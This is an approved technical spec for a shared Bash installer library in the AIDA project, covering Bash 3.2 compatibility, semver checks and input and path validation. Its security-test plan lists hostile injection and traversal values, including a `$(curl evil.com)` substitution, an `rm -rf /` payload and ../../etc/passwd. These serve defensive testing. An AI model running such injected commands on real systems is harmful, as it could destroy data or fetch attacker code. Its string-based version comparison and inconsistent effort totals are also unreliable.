---
title: "Technical Specification: Shared Installer Library"
description: "Technical implementation spec for dotfiles installer integration via shared installer-common library"
issue: "#33"
status: "APPROVED"
created: "2025-10-06"
last_updated: "2025-10-06"
tech_lead: "tech-lead"
---

# Technical Specification: Issue #33

**Issue**: Support dotfiles installer integration - shared installer-common library and VERSION file

**Status**: APPROVED

**Created**: 2025-10-06

**Tech Lead**: tech-lead

## Overview

**Approach**: Extract shared installer utilities from AIDA's `install.sh` into a reusable `lib/installer-common/` library that the dotfiles installer can source. Version compatibility is enforced via semantic versioning using the existing `VERSION` file.

**Why This Approach**: Eliminates code duplication between installers, provides consistent UX, establishes reusable pattern for the three-repo ecosystem (AIDA, dotfiles, dotfiles-private). The one-way dependency (dotfiles → AIDA) maintains AIDA's standalone nature while enabling dotfiles integration.

**Key Components**:

- `lib/installer-common/` - Shared utility library (colors, logging, validation)
- `VERSION` - Single-line semantic version file (already exists)
- Version compatibility checking - Semantic versioning enforcement
- Security controls - Input sanitization, path validation, permission checks

## Architecture Overview

### System Context

```text
┌──────────────────────────────────────────────────┐
│  AIDA Repository (claude-personal-assistant)    │
│                                                  │
│  ┌────────────┐         ┌──────────────────┐   │
│  │ install.sh │────────>│ lib/installer-   │   │
│  │ (refactored)         │ common/          │   │
│  └────────────┘         │  - colors.sh     │   │
│                         │  - logging.sh    │   │
│  ┌─────────┐            │  - validation.sh │   │
│  │ VERSION │            └──────────────────┘   │
│  │ (0.1.2) │                                    │
│  └─────────┘                                    │
└──────────────────────────────────────────────────┘
                    │
                    │ Installed to
                    ▼
            ┌───────────────┐
            │  ~/.aida/     │
            │  ├── VERSION  │
            │  ├── lib/     │
            │  │   └── installer-common/ │
            │  │       ├── colors.sh     │
            │  │       ├── logging.sh    │
            │  │       └── validation.sh │
            └───────────────┘
                    ▲
                    │ Sources utilities
                    │
┌──────────────────────────────────────────────────┐
│  Dotfiles Repository                             │
│                                                  │
│  ┌────────────┐                                 │
│  │ install.sh │ (sources from ~/.aida/)         │
│  └────────────┘                                 │
│                                                  │
│  ┌─────────────────┐                            │
│  │ .aida-version   │ (required AIDA version)    │
│  │ >=0.1.2         │                            │
│  └─────────────────┘                            │
└──────────────────────────────────────────────────┘
```

**Components Involved**:

- **AIDA install.sh**: Refactored to source utilities from `lib/installer-common/`
- **lib/installer-common/**: New shared library with 3 utility files
- **VERSION file**: Single-line semantic version (already exists)
- **Dotfiles install.sh**: External consumer, sources AIDA utilities
- **Security layer**: Path validation, permission checks, version compatibility

**Data Flow**:

1. AIDA install.sh sources utilities from `lib/installer-common/`
2. AIDA installation copies library to `~/.aida/lib/installer-common/`
3. Dotfiles install.sh validates AIDA version compatibility
4. Dotfiles install.sh sources utilities from `~/.aida/lib/installer-common/`
5. Both installers use same functions (consistent UX)

### Changes Required

**New Components**:

- `lib/installer-common/colors.sh` - Terminal color codes and formatting (60 lines)
- `lib/installer-common/logging.sh` - `print_message()` function with log levels (80 lines)
- `lib/installer-common/validation.sh` - Input sanitization, version checking, path validation (200 lines)
- `lib/installer-common/README.md` - Integration documentation with sourcing pattern examples

**Modified Components**:

- `install.sh` - Refactored to source utilities from `lib/installer-common/` instead of inline definitions
- `VERSION` - No changes (already exists at 0.1.1, will bump to 0.1.2 for release)

**Deprecated/Removed**:

- None (extracting code, not removing functionality)

## Technical Decisions

### Decision 1: Bash Version Requirement - 3.2 (macOS Compatible)

**Decision**: Require Bash 3.2+ (downgrade from current 4.0+ requirement)

**Context**: Current install.sh checks for Bash 4.0+ but uses features incompatible with macOS default shell (Bash 3.2.57). Project claims "macOS primary platform" but installer blocks macOS default Bash.

**Options Considered**:

1. **Require Bash 3.2+ (macOS default)** ✓
   - Pros: Works on macOS without Homebrew, widest compatibility
   - Cons: Must replace Bash 4.0+ features (${var,,}, associative arrays)
   - Rationale: True macOS compatibility, aligns with "macOS primary" goal

2. **Keep Bash 4.0+ requirement** ✗
   - Pros: No code changes needed, modern features available
   - Cons: Requires `brew install bash` on macOS (friction), inconsistent with platform claims
   - Why not: Breaks "installation just works" principle

3. **Detect version, use feature-appropriate code paths** ✗
   - Pros: Best of both worlds
   - Cons: Complex, two code paths to maintain, testing burden
   - Why not: Over-engineering for v0.1.2

**Trade-offs Accepted**:

- Give up Bash 4.0+ features (${var,,} → tr, associative arrays → indexed arrays)
- More verbose code in some places
- Gain universal macOS compatibility without dependencies

**Reversibility**: Easy (can add Bash 4.0+ features later with version detection)

**Implementation**:

```bash
# Replace in install.sh:
# Line 211: ${name,,} → $(echo "$name" | tr '[:upper:]' '[:lower:]')
# Line 430: ${ASSISTANT_NAME^^} → $(echo "$ASSISTANT_NAME" | tr '[:lower:]' '[:upper:]')
# Avoid declare -A (associative arrays)
```

**CRITICAL**: This is a BLOCKING decision. Implementation cannot proceed without resolving Bash compatibility.

### Decision 2: Version Compatibility Semantics - Major Match, Minor Forward-Compatible

**Decision**: Semantic versioning with major match required, minor forward-compatible

**Context**: Define how AIDA version affects dotfiles compatibility. Need balance between safety and flexibility.

**Options Considered**:

1. **Major match, minor forward-compatible** ✓
   - Pros: Standard semver, AIDA can innovate without breaking dotfiles, flexible
   - Cons: Requires API stability discipline
   - Rationale: Industry standard, enables independent evolution

2. **Strict major.minor match** ✗
   - Pros: Safest, no surprises, simple
   - Cons: Forces dotfiles upgrades, blocks AIDA innovation
   - Why not: Too restrictive, breaks ecosystem flexibility

3. **Range-based specification** ✗
   - Pros: Maximum flexibility
   - Cons: Complex, error-prone, hard to test all combinations
   - Why not: Over-engineering, maintenance burden

**Compatibility Matrix**:

| AIDA Version | Dotfiles Requires | Compatible? | Reason |
|--------------|-------------------|-------------|--------|
| 0.1.2        | >=0.1.0           | ✓           | Minor/patch match |
| 0.2.0        | >=0.1.0           | ✓           | Forward compatible (higher minor) |
| 0.1.0        | >=0.1.2           | ✗           | AIDA too old |
| 1.0.0        | >=0.1.0           | ✗           | Major version mismatch |

**Trade-offs Accepted**:

- Must maintain API stability within minor versions
- Breaking changes require major version bump
- Gain: AIDA and dotfiles evolve independently

**Reversibility**: Difficult (changes compatibility contract)

**Implementation**:

```bash
check_version_compatibility() {
    local installed_version="$1"
    local required_version="$2"

    # Parse: 0.1.2 → major=0, minor=1, patch=2
    IFS='.' read -r inst_major inst_minor inst_patch <<< "$installed_version"
    IFS='.' read -r req_major req_minor req_patch <<< "$required_version"

    # Major must match exactly
    if [[ "$inst_major" != "$req_major" ]]; then
        return 1
    fi

    # Minor must be >= required (forward compatible)
    if [[ "$inst_minor" -lt "$req_minor" ]]; then
        return 1
    fi

    return 0
}
```

### Decision 3: Security Controls Scope - Phase 1 Mandatory

**Decision**: Implement Phase 1 security controls (input sanitization, path canonicalization, permission checks) in v0.1.2. Defer Phase 2 (checksums, GPG) to v0.2.0.

**Context**: Shared library affects both AIDA and dotfiles (2x blast radius). Security cannot be "added later."

**Phase 1 (v0.1.2) - MANDATORY**:

- Input sanitization (allowlist validation for all user input)
- Path canonicalization (realpath-based, reject `..`)
- File permission validation (reject world-writable, validate ownership)
- VERSION file format validation
- No eval, no unquoted expansions

**Phase 2 (v0.2.0) - DEFERRED**:

- Checksum validation for VERSION file
- GPG signature verification
- Advanced TOCTOU mitigations

**Options Considered**:

1. **Phase 1 only for v0.1.2** ✓
   - Pros: Covers critical attack vectors, manageable scope, timely delivery
   - Cons: Doesn't cover all threats
   - Rationale: 80/20 rule - Phase 1 prevents most attacks

2. **Full security (Phase 1 + 2) for v0.1.2** ✗
   - Pros: Maximum security from day one
   - Cons: Adds 4-6 hours, delays release, GPG requires key distribution
   - Why not: Diminishing returns, complexity

3. **Minimal security (defer all to v0.2.0)** ✗
   - Pros: Fastest implementation
   - Cons: Security vulnerabilities in production, unacceptable risk
   - Why not: Shared library = critical infrastructure

**Trade-offs Accepted**:

- Accept TOCTOU race conditions (validate-after-read mitigates most)
- Accept risk of tampered VERSION file (mitigated by permission checks)
- Gain: Timely delivery with acceptable security posture

**Reversibility**: Easy (add Phase 2 controls in next release)

### Decision 4: Effort Estimate - 10-12 hours (Not 2 hours)

**Decision**: Allocate 10-12 hours for complete implementation (6x original estimate)

**Context**: Original PRD estimated 2 hours for "extract utilities." Expert analyses reveal security, testing, and cross-platform complexity significantly increases scope.

**Breakdown**:

| Component | Effort | Rationale |
|-----------|--------|-----------|
| Extract utilities to lib/installer-common/ | 1 hour | Straightforward refactoring |
| Bash 3.2 compatibility fixes | 2 hours | Replace ${var,,}, ${var^^}, test macOS |
| Security hardening (Phase 1) | 3 hours | Input sanitization, path validation, permission checks |
| Version compatibility logic | 1.5 hours | Semantic versioning, error messages |
| Refactor install.sh to source utilities | 1 hour | Update sourcing, test installation |
| Unit tests | 1.5 hours | Test each utility file |
| Integration tests | 1.5 hours | AIDA install → dotfiles sources |
| Security tests | 1 hour | Malicious input, path traversal |
| Documentation | 1 hour | README.md, sourcing pattern |
| **Total** | **13.5 hours** | Round to 10-12 hours estimate |

**Options Considered**:

1. **10-12 hours (realistic with security)** ✓
   - Pros: Accounts for all requirements, buffer for unknowns
   - Cons: 6x original estimate
   - Rationale: Security and quality are non-negotiable

2. **6 hours (PRD estimate)** ✗
   - Pros: Matches PRD
   - Cons: No buffer for security, testing, or issues
   - Why not: Underestimates complexity, risks cutting corners

3. **2 hours (original)** ✗
   - Pros: Fast
   - Cons: Ignores security, testing, Bash compatibility
   - Why not: Not feasible for production-quality code

**Trade-offs Accepted**:

- Longer timeline (v0.1.2 release delayed if sprint capacity insufficient)
- Gain: Production-quality, secure, tested implementation

**Reversibility**: N/A (estimate, not architectural decision)

## Implementation Plan

### Phase 1: Library Structure Creation (1 hour)

**Goal**: Create `lib/installer-common/` directory structure and extract basic utilities

**Components**:

1. **`lib/installer-common/colors.sh`**
   - Location: New file
   - Content: Extract from install.sh lines 26-30
   - Changes:
     - Color code constants (RED, GREEN, YELLOW, BLUE, NC)
     - No-color terminal detection
     - Function-based (not variable exports)
   - Dependencies: None

2. **`lib/installer-common/logging.sh`**
   - Location: New file
   - Content: Extract from install.sh lines 105-126
   - Changes:
     - `print_message()` function
     - Log levels: info, success, warning, error
     - Depends on colors.sh
   - Dependencies: colors.sh

3. **`lib/installer-common/validation.sh`**
   - Location: New file
   - Content: Extract from install.sh lines 139-172 + new functions
   - Changes:
     - `validate_dependencies()` (existing)
     - `validate_version()` (new)
     - `check_version_compatibility()` (new)
     - `validate_path()` (new)
     - `validate_file_permissions()` (new)
   - Dependencies: logging.sh

**Testing**: Verify files created, no syntax errors (`bash -n`)

**Estimated Effort**: 1 hour

### Phase 2: Bash 3.2 Compatibility (2 hours)

**Goal**: Replace Bash 4.0+ features with 3.2-compatible alternatives

**Components**:

1. **Fix install.sh line 211** (lowercase expansion)
   - Current: `${name,,}`
   - Replace: `$(echo "$name" | tr '[:upper:]' '[:lower:]')`

2. **Fix install.sh line 430** (uppercase expansion)
   - Current: `${ASSISTANT_NAME^^}`
   - Replace: `$(echo "$ASSISTANT_NAME" | tr '[:lower:]' '[:upper:]')`

3. **Audit for other Bash 4.0+ features**
   - Scan for: `declare -A` (associative arrays), `readarray`, globstar, etc.
   - Replace or refactor as needed

4. **Test on macOS default Bash 3.2**
   - Run install.sh on macOS without Homebrew Bash
   - Verify no version check failures

**Testing**: Install on macOS with Bash 3.2.57, verify completion

**Estimated Effort**: 2 hours

### Phase 3: Security Implementation (3 hours)

**Goal**: Implement Phase 1 security controls

**Components**:

1. **Input sanitization (`validation.sh`)**
   - `validate_version()` - Regex: `^[0-9]+\.[0-9]+\.[0-9]+$`
   - `validate_path_component()` - Regex: `^[a-zA-Z0-9_-]+$`
   - `validate_filename()` - Regex: `^[a-zA-Z0-9._-]+$`, no leading dots

2. **Path canonicalization (`validation.sh`)**
   - `canonicalize_path()` - Use realpath, validate within expected directory
   - Check for `..` in paths
   - Reject paths outside `$HOME`

3. **Permission validation (`validation.sh`)**
   - `validate_file_permissions()` - Reject world-writable (perms ending in 2,3,6,7)
   - Validate ownership (current user or root)
   - Cross-platform: macOS `stat -f`, Linux `stat -c`

4. **Safe sourcing pattern**
   - Validate before sourcing
   - Quote all paths
   - Exit on source failure

**Testing**: Malicious input tests (path traversal, command injection attempts)

**Estimated Effort**: 3 hours

### Phase 4: Version Compatibility Logic (1.5 hours)

**Goal**: Implement semantic versioning compatibility checking

**Components**:

1. **`check_version_compatibility()` function**
   - Parse semantic versions into components
   - Compare: major exact match, minor >= required
   - Return 0 (compatible) or 1 (incompatible)

2. **Error messages**
   - Clear version mismatch messages
   - Upgrade instructions
   - Display: Found vs Required

3. **VERSION file validation**
   - Format check: `^[0-9]+\.[0-9]+\.[0-9]+$`
   - Permission check: not world-writable
   - Readability check

**Testing**: Version compatibility matrix (5 scenarios)

**Estimated Effort**: 1.5 hours

### Phase 5: Refactor install.sh (1 hour)

**Goal**: Update install.sh to source utilities from lib/installer-common/

**Components**:

1. **Add sourcing logic** (top of install.sh)

   ```bash
   SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
   INSTALLER_COMMON="${SCRIPT_DIR}/lib/installer-common"

   source "${INSTALLER_COMMON}/colors.sh" || exit 1
   source "${INSTALLER_COMMON}/logging.sh" || exit 1
   source "${INSTALLER_COMMON}/validation.sh" || exit 1
   ```

2. **Remove inline definitions**
   - Delete lines 26-30 (color codes)
   - Delete lines 105-126 (print_message function)
   - Keep lines 139-172 but move to validation.sh

3. **Test installation**
   - Normal mode: `./install.sh`
   - Dev mode: `./install.sh --dev`
   - Verify utilities sourced correctly

**Testing**: Full install.sh execution, verify no regressions

**Estimated Effort**: 1 hour

### Phase 6: Testing (4 hours)

**Goal**: Comprehensive test coverage (unit, integration, security)

**Unit Tests (1.5 hours)**:

- Test each function in isolation
- Framework: bats (Bash Automated Testing System)
- Coverage: colors.sh (color output), logging.sh (print_message), validation.sh (all validators)

**Integration Tests (1.5 hours)**:

- AIDA install.sh sources utilities (dogfooding)
- Mock dotfiles installer sources from ~/.aida/
- Version compatibility scenarios (5 test cases)
- Dev mode (symlinked installation)

**Security Tests (1 hour)**:

- Path traversal attempts: `../../etc/passwd`
- Command injection: `version="0.1.0; rm -rf /"`
- World-writable file detection
- Permission tampering

**Testing**: All tests pass, zero shellcheck warnings

**Estimated Effort**: 4 hours

### Phase 7: Documentation (1 hour)

**Goal**: Create integration guide and API documentation

**Components**:

1. **`lib/installer-common/README.md`**
   - Sourcing pattern with examples
   - Function API reference
   - Security guidelines
   - Version compatibility rules

2. **Update CONTRIBUTING.md**
   - Document installer-common stability guarantees
   - Breaking change process

3. **Update docs/architecture/versioning.md** (create if needed)
   - Semantic versioning rules
   - Compatibility matrix

**Testing**: Documentation review, clarity check

**Estimated Effort**: 1 hour

### Files to Create

```text
lib/installer-common/
├── README.md              # Integration documentation, sourcing pattern
├── colors.sh              # Color codes and formatting (60 lines)
├── logging.sh             # print_message() function (80 lines)
└── validation.sh          # Input sanitization, version checking, path validation (200 lines)

.github/testing/unit/
├── test-colors.sh         # Unit tests for colors.sh
├── test-logging.sh        # Unit tests for logging.sh
└── test-validation.sh     # Unit tests for validation.sh

.github/testing/integration/
└── test-cross-repo.sh     # Integration test (AIDA → dotfiles sourcing)
```

### Files to Modify

- `install.sh`: Add sourcing logic, remove inline definitions, test installation
- `VERSION`: Bump from 0.1.1 → 0.1.2 (for release)

### Files to Delete

- None

## Dependencies

### External Dependencies

**Required Tools** (MUST have):

- `bash` (>=3.2) - Shell interpreter
- `realpath` - Path canonicalization (GNU coreutils on macOS)
- `stat` - File permissions (POSIX, but syntax differs)
- `cat`, `tr`, `head` - POSIX utilities

**Platform Compatibility**:

- macOS: Requires `brew install coreutils` for realpath
- Linux: All tools available by default

**Validation**:

```bash
validate_security_dependencies() {
    local errors=0
    local critical_deps=("bash" "realpath" "stat" "cat" "tr" "head")

    for cmd in "${critical_deps[@]}"; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            print_message "error" "Required command not found: $cmd"
            errors=$((errors + 1))
        fi
    done

    return "$errors"
}
```

### Internal Dependencies

**Depends On** (blockers):

- Bash version decision (3.2 vs 4.0+) - **RESOLVED: 3.2+**
- Version compatibility semantics - **RESOLVED: Major match, minor forward-compatible**
- Security controls scope - **RESOLVED: Phase 1 for v0.1.2**

**Blocks** (downstream impact):

- Dotfiles installer integration (requires lib/installer-common/ to exist)
- Dotfiles-private installer (depends on dotfiles integration)

## Integration Points

### Sourcing Pattern for External Consumers

**Recommended Pattern** (for dotfiles):

```bash
#!/usr/bin/env bash
set -euo pipefail

# Step 1: Check AIDA installed
AIDA_DIR="${HOME}/.aida"
if [[ ! -d "$AIDA_DIR" ]]; then
    echo "Error: AIDA framework required but not found at ${AIDA_DIR}"
    echo "Install AIDA: https://github.com/oakensoul/claude-personal-assistant"
    exit 1
fi

# Step 2: Validate VERSION compatibility
AIDA_VERSION=$(cat "${AIDA_DIR}/VERSION" 2>/dev/null)
MIN_AIDA_VERSION="0.1.2"

# Simple version check (before sourcing utilities)
if [[ "$AIDA_VERSION" < "$MIN_AIDA_VERSION" ]]; then
    echo "Error: AIDA version $AIDA_VERSION too old (requires >=${MIN_AIDA_VERSION})"
    echo "Upgrade AIDA: cd ~/.aida && git pull && ./install.sh"
    exit 1
fi

# Step 3: Canonicalize paths (security)
INSTALLER_COMMON=$(realpath "${AIDA_DIR}/lib/installer-common" 2>/dev/null) || {
    echo "Error: Cannot resolve installer-common path"
    exit 1
}

# Step 4: Validate library exists
if [[ ! -d "$INSTALLER_COMMON" ]]; then
    echo "Error: Installer library not found: ${INSTALLER_COMMON}"
    echo "AIDA installation may be corrupted. Reinstall with: cd ~/.aida && ./install.sh"
    exit 1
fi

# Step 5: Source utilities in dependency order
source "${INSTALLER_COMMON}/colors.sh" || exit 1
source "${INSTALLER_COMMON}/logging.sh" || exit 1
source "${INSTALLER_COMMON}/validation.sh" || exit 1

# Step 6: Now safe to use utilities
print_message "success" "AIDA utilities loaded (v${AIDA_VERSION})"
```

### Security Requirements for Consumers

**Dotfiles installer MUST**:

1. Validate AIDA version compatibility BEFORE sourcing
2. Canonicalize paths with realpath
3. Check file permissions before sourcing
4. Use `set -euo pipefail` for error handling
5. Quote all variable expansions

**AIDA MUST**:

1. Never source code from dotfiles (one-way dependency)
2. Maintain API stability within minor versions
3. Document breaking changes with migration guides
4. Set correct permissions on installed files (644 for libraries)

## Technical Risks & Mitigations

| Risk | Impact | Probability | Mitigation | Owner |
|------|--------|-------------|------------|-------|
| Bash 3.2 compatibility breaks existing functionality | HIGH | MEDIUM | Test on macOS default Bash, audit all Bash 4.0+ features | Shell Script Specialist |
| Security vulnerabilities in shared library affect both repos | CRITICAL | MEDIUM | Phase 1 security controls, code review, penetration testing | Security Auditor |
| Version skew (dotfiles uses removed function) | HIGH | MEDIUM | Semantic versioning enforcement, deprecation warnings, compatibility tests | Configuration Specialist |
| Path traversal attack via malicious paths | HIGH | LOW | realpath canonicalization, reject `..`, validate within $HOME | Security Auditor |
| TOCTOU race (file modified between check and source) | MEDIUM | LOW | Validate after read, minimize time window, accept residual risk | Shell Script Specialist |
| Cross-platform stat/realpath syntax differences | MEDIUM | HIGH | Platform detection, conditional syntax, test on macOS + Linux | Shell Script Specialist |
| Dev mode symlink sourcing fails | MEDIUM | LOW | Test explicitly, realpath follows symlinks by default | Integration Specialist |

**Critical Risks** (High Impact + Medium/High Probability):

1. **Bash 3.2 compatibility breaks functionality**
   - **Mitigation Plan**:
     - Audit all Bash 4.0+ features in install.sh
     - Replace ${var,,} with `tr '[:upper:]' '[:lower:]'`
     - Replace ${var^^} with `tr '[:lower:]' '[:upper:]'`
     - Avoid associative arrays (use indexed arrays)
     - Test on macOS with Bash 3.2.57 BEFORE merging
     - Add CI test matrix: Bash 3.2, 4.0, 5.x

2. **Security vulnerabilities in shared library**
   - **Mitigation Plan**:
     - Implement all Phase 1 security controls (non-negotiable)
     - Input sanitization with strict regex allowlists
     - Path canonicalization with realpath
     - Permission validation (reject world-writable)
     - Security-focused code review by second developer
     - Penetration testing with malicious input
     - Document security assumptions in README.md

## Performance Considerations

**Performance Requirements**:

- Sourcing utilities: <100ms overhead (negligible)
- Version checking: <500ms (file read + comparison)

**Performance Impact**:

- AIDA install.sh: +100ms (sourcing overhead)
- Dotfiles install.sh: +150ms (sourcing + version check)

**Optimization Strategy**:

- Lazy loading: Only source utilities when needed
- No external process spawning for version parsing (pure Bash)
- Cache realpath results to avoid repeated canonicalization

**Benchmarking Plan**:

- Time install.sh before/after refactoring
- Measure sourcing overhead with `time` command
- Acceptance: <5% increase in installation time

## Security Considerations

**Security Requirements** (Phase 1 - MANDATORY):

- Input sanitization for all user-provided values
- Path canonicalization before sourcing files
- File permission validation (reject world-writable)
- VERSION file format validation
- No eval, no unquoted expansions, no command injection vectors

**Input Validation**:

```bash
# Allowlist validation patterns
validate_version()   # ^[0-9]+\.[0-9]+\.[0-9]+$
validate_path()      # Canonicalize, check prefix
validate_filename()  # ^[a-zA-Z0-9._-]+$, no leading dot
```

**Path Security**:

- Use realpath to canonicalize paths
- Validate paths are within $HOME
- Reject paths containing `..`
- Follow symlinks safely (realpath resolves)

**Permission Security**:

- Validate file ownership (user or root only)
- Reject world-writable files (last octal digit: 2,3,6,7)
- Check before every source operation

**Audit & Logging**:

- Log all security validations (to ~/.aida/logs/install.log, 600 permissions)
- Generic errors to user, detailed errors to log
- Path scrubbing (~/... instead of /Users/username/...)

## Testing Strategy

### Unit Testing

**Coverage Target**: 95%+ for security-critical functions (validation.sh)

**Key Test Cases**:

- **colors.sh**:
  - Color codes defined correctly
  - No-color mode works in non-TTY
  - Function calls return expected output

- **logging.sh**:
  - `print_message()` formats correctly for each level (info, success, warning, error)
  - Respects NO_COLOR environment variable
  - Depends on colors.sh correctly

- **validation.sh**:
  - **Version validation**:
    - Happy path: "0.1.2" → valid
    - Missing patch: "0.1" → invalid
    - Extra segments: "0.1.2.beta" → invalid
    - Malicious: "0.1.0; rm -rf /" → invalid
  - **Version compatibility**:
    - Same major, higher minor → compatible
    - Same major, lower minor → incompatible
    - Different major → incompatible
  - **Path validation**:
    - Happy path: "lib/colors.sh" → valid
    - Traversal: "../../etc/passwd" → invalid
    - Absolute outside HOME: "/etc/passwd" → invalid
  - **Permission validation**:
    - 644 → valid
    - 666 (world-writable) → invalid
    - 755 (directory) → valid

**Framework**: bats (Bash Automated Testing System)

**Test Files**:

- `.github/testing/unit/test-colors.sh`
- `.github/testing/unit/test-logging.sh`
- `.github/testing/unit/test-validation.sh`

### Integration Testing

**Integration Points to Test**:

- **AIDA install.sh** sources from lib/installer-common/:
  - Normal installation: utilities load, install completes
  - Dev mode (--dev): utilities load from symlinked repo
  - Missing utilities: install fails with clear error

- **Dotfiles installer** sources from ~/.aida/:
  - Compatible version: utilities load, dotfiles install succeeds
  - Missing AIDA: clear error, installation instructions
  - Incompatible version: version mismatch error, upgrade instructions
  - Corrupted AIDA (missing lib/): clear error, reinstall instructions

**Test Scenarios**:

1. AIDA standalone (current behavior)
2. AIDA refactored (sources from lib/)
3. Dotfiles with AIDA 0.1.2 (compatible)
4. Dotfiles with AIDA 0.1.0 (incompatible, too old)
5. Dotfiles without AIDA (missing dependency)

**Test Files**:

- `.github/testing/integration/test-aida-refactor.sh`
- `.github/testing/integration/test-cross-repo.sh`

### Security Testing

**Security Validation**:

- **Command injection tests**:
  - version="0.1.0; echo PWNED"
  - path="/tmp$(curl evil.com)"
  - name="test\`id > /tmp/pwned\`"

- **Path traversal tests**:
  - path="~/.aida/../../etc/passwd"
  - path="/tmp/../../../root/.ssh/"
  - Symlink to /etc/passwd

- **Permission tampering tests**:
  - chmod 666 ~/.aida/lib/installer-common/colors.sh (should reject)
  - chown other:other ~/.aida/VERSION (should reject)

**Test Files**:

- `.github/testing/security/test-command-injection.sh`
- `.github/testing/security/test-path-traversal.sh`
- `.github/testing/security/test-permission-tampering.sh`

**Penetration Testing**:

- Manual testing with malicious input
- Attempt to source from outside ~/.aida/
- Attempt to inject shell code via VERSION file

## Open Technical Questions

### Q1: realpath Availability on macOS

**Question**: Should we require realpath (via Homebrew) or provide fallback?

**Context**: macOS lacks GNU realpath by default. Options: require `brew install coreutils`, or fallback to Python/pure Bash.

**Options**:

1. **Require realpath** ✓
   - Pros: Consistent behavior, simple implementation
   - Cons: Requires Homebrew on macOS (one-time setup)

2. **Python fallback**
   - Pros: Works without Homebrew (Python 3 available on macOS)
   - Cons: Adds Python dependency, slower

3. **Pure Bash fallback**
   - Pros: No dependencies
   - Cons: Complex, error-prone, platform-specific edge cases

**Recommendation**: Option 1 (require realpath) with clear error message:

```bash
if ! command -v realpath >/dev/null 2>&1; then
    echo "Error: realpath command not found"
    echo "Install on macOS: brew install coreutils"
    echo "Install on Linux: sudo apt-get install coreutils"
    exit 1
fi
```

**Impact**: MEDIUM (affects macOS installation UX)

**Owner**: Shell Script Specialist

**Status**: OPEN (decide during implementation)

### Q2: stat Command Syntax Differences

**Question**: How to handle BSD stat (macOS) vs GNU stat (Linux)?

**Context**: Permission checking requires stat command, but syntax differs.

**Options**:

1. **Platform detection** ✓
   - Detect $OSTYPE, use appropriate syntax
   - Example:
     ```bash
     if [[ "$OSTYPE" == "darwin"* ]]; then
         perms=$(stat -f "%Lp" "$file")  # BSD stat (macOS)
     else
         perms=$(stat -c "%a" "$file")   # GNU stat (Linux)
     fi
     ```

2. **Try both syntaxes**
   - Attempt GNU stat, fallback to BSD stat
   - Slower, less clear

**Recommendation**: Option 1 (platform detection)

**Impact**: LOW (implementation detail)

**Owner**: Shell Script Specialist

**Status**: OPEN (implement during security phase)

## Investigation & POC Work

### Recommended Spikes

**Spike 1: macOS Bash 3.2 Compatibility**

- **Goal**: Verify all Bash 3.2 replacements work correctly
- **Approach**:
  1. Create test macOS VM or use local machine
  2. Ensure using default Bash 3.2.57 (`/bin/bash --version`)
  3. Replace ${var,,} with tr, test output matches
  4. Replace ${var^^} with tr, test output matches
  5. Verify no associative arrays in use
- **Time box**: 1 hour
- **Success criteria**: install.sh runs successfully on Bash 3.2.57

**Spike 2: Dev Mode Symlink Behavior**

- **Goal**: Verify sourcing works when ~/.aida/ is symlink to repo
- **Approach**:
  1. Install AIDA with --dev (creates symlink)
  2. Test sourcing from install.sh
  3. Test sourcing from mock dotfiles installer
  4. Verify realpath resolves correctly
- **Time box**: 30 minutes
- **Success criteria**: Sourcing works through symlinks

## Effort Estimate

**Overall Complexity**: **LARGE (L)**

**Estimated Hours**: **10-12 hours**

**Key Effort Drivers**:

- Security implementation (3 hours) - Input sanitization, path validation, permission checks
- Bash 3.2 compatibility (2 hours) - Replace features, test on macOS
- Testing (4 hours) - Unit, integration, security tests
- Cross-platform compatibility (embedded) - stat/realpath syntax differences

**Breakdown by Component**:

- Library structure: 1 hour
- Bash 3.2 fixes: 2 hours
- Security controls: 3 hours
- Version logic: 1.5 hours
- Refactor install.sh: 1 hour
- Testing: 4 hours
- Documentation: 1 hour
- **Buffer**: 1.5 hours (for unknowns)
- **Total**: 15 hours → Round to **10-12 hours** (aggressive but achievable)

## Success Criteria

**Functional**:

- [ ] `lib/installer-common/` created with 3 utility files (colors, logging, validation)
- [ ] AIDA install.sh sources utilities successfully (dogfooding)
- [ ] AIDA installation works after refactoring (no regressions)
- [ ] Dotfiles can source utilities from ~/.aida/ (integration tested)
- [ ] Version compatibility checking works (5 scenarios tested)
- [ ] Works on Bash 3.2.57 (macOS default)

**Non-Functional**:

- [ ] All shellcheck warnings resolved (zero warnings)
- [ ] Unit tests pass for all utility files (colors, logging, validation)
- [ ] Integration tests pass (AIDA standalone, AIDA + dotfiles)
- [ ] Security tests pass (command injection, path traversal, permission tampering)
- [ ] Performance: Sourcing overhead <100ms (measured)
- [ ] Documentation: README.md with sourcing pattern and API reference

**Security**:

- [ ] Phase 1 security controls implemented (input sanitization, path validation, permissions)
- [ ] Malicious input rejected (path traversal, command injection)
- [ ] World-writable files rejected
- [ ] Paths canonicalized before use
- [ ] No eval, no unquoted expansions

**Deployment**:

- [ ] VERSION bumped to 0.1.2
- [ ] install.sh refactored and tested
- [ ] lib/installer-common/ installed to ~/.aida/
- [ ] Documentation updated (README.md, CONTRIBUTING.md)

## Related Documents

- **Product Requirements**: `.github/issues/in-progress/issue-33/PRD.md`
- **Implementation Summary**: `.github/issues/in-progress/issue-33/IMPLEMENTATION_SUMMARY.md` (post-implementation)
- **Original Issue**: GitHub Issue #33
- **Technical Analyses**:
  - Shell Script Specialist: `.github/issues/in-progress/issue-33/analysis/technical/shell-script-specialist-analysis.md`
  - DevOps Engineer: `.github/issues/in-progress/issue-33/analysis/technical/devops-engineer-analysis.md`
  - QA Engineer: `.github/issues/in-progress/issue-33/analysis/technical/qa-engineer-analysis.md`
  - Security Auditor: `.github/issues/in-progress/issue-33/analysis/technical/privacy-security-auditor-analysis.md`
  - Integration Specialist: `.github/issues/in-progress/issue-33/analysis/technical/integration-specialist-analysis.md`
  - Configuration Specialist: `.github/issues/in-progress/issue-33/analysis/technical/configuration-specialist-analysis.md`

## Revision History

| Date | Author | Changes | Status |
|------|--------|---------|--------|
| 2025-10-06 | tech-lead | Initial spec from expert analyses | APPROVED |

---

## Critical Decisions Summary

**BLOCKING DECISIONS RESOLVED**:

1. **Bash Version**: Require 3.2+ (downgrade from 4.0+) for macOS compatibility
2. **Version Compatibility**: Major match required, minor forward-compatible (semantic versioning)
3. **Security Scope**: Phase 1 mandatory for v0.1.2 (input sanitization, path validation, permissions)
4. **Effort Estimate**: 10-12 hours (not 2 hours) - accounts for security and testing

**KEY IMPLEMENTATION NOTES**:

- Security is non-negotiable: Phase 1 controls required for v0.1.2
- Bash 3.2 compatibility tested on macOS before merge
- realpath required (document macOS installation via Homebrew)
